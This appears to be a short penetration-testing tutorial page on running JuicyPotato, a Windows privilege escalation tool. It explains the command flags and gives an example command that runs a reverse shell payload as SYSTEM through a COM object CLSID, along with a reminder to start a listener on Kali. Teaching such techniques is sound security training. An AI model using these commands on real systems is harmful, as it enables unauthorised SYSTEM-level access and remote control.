Executing JuicyPotato

A command-line example for privilege escalation

JuicyPotato Command Breakdown

The JuicyPotato command requires several parameters to successfully execute the attack. Each flag plays a vital role in configuring the NTLM listener, specifying the payload, and targeting the correct COM object.

  • -l <port>: Local port for the NTLM listener.
  • -p <program>: Path to the program to execute (your reverse shell).
  • -a "<args>": Arguments for the program.
  • -t <target>: Target token type (`*` for any, `s` for SYSTEM).
  • -c {CLSID}: CLSID of a COM object to trigger NTLM authentication.
Common Mistake

Forgetting to set up your reverse shell listener on Kali before executing JuicyPotato on the target.

Example JuicyPotato Execution

# Example JuicyPotato execution (assuming you have a reverse shell payload) JuicyPotato.exe -l 1337 -p C:\Temp\shell.exe -a "C:\Temp\shell.exe" -t * -c {CLSID_OF_COM_OBJECT} # -l: local port for the NTLM listener # -p: program to execute (your reverse shell) # -a: arguments for the program # -t: target (e.g., '*' for any token, 'u' for current user, 's' for SYSTEM) # -c: CLSID of a COM object to trigger NTLM authentication
Key Takeaway

JuicyPotato execution involves specifying a listener port, payload, target token, and a critical COM object CLSID.
